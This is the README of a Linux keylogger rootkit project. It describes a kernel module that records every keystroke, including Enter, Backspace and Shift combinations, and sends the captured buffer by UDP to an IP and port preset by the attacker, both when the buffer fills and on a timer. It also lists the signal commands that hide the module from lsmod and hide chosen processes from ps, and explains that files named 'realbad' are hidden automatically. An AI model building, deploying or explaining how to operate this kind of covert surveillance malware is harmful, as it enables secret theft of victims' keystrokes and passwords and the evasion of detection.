# KeyloggerRootkit
This project implements a Linux keylogger rootkit module that sends logs over network and hides its existence

- The keylogger will log all the ASCII characters, <kbd>ENTER</kbd> ``'\n'``, <kbd>BACKSPACE</kbd> ``'\b'``, <kbd>ESC</kbd> ``'\e'``, and <kbd>TAB</kbd> ``'\t'``. <kbd>SHIFT</kbd> with a key will change the corresponding character into upper case or a different symbol.
- All the keys stored will be put into a local buffer (char array) named ``key_buf``
- ``key_buf`` has a size preset by the attacker and when ``key_buf`` is full, a udp packet containing the whole buffer will be sent to the attacker.
- The ip address and udp port are preset by the attacker.
- The keylogger also implements a timer that periodically checks ``key_buf``. If ``key_buf`` is not empty, a udp packet containing its content will be sent to the attacker. The period of the timer is preset by the attacker.

Hidings implemented:

To hide this module: kill -64 1. Check lsmod to see keylogger is gone.

To hide any pid: kill -63 <pid>. e.g. to hide process bash with pid 2296, do kill -63 2296. Check ps to see bash is gone.
  
To hide a file, we currently have it hardcoded to hide any files or directories named "realbad". This can be changed to our needs. The file hiding is automatic when keylogger is loaded.
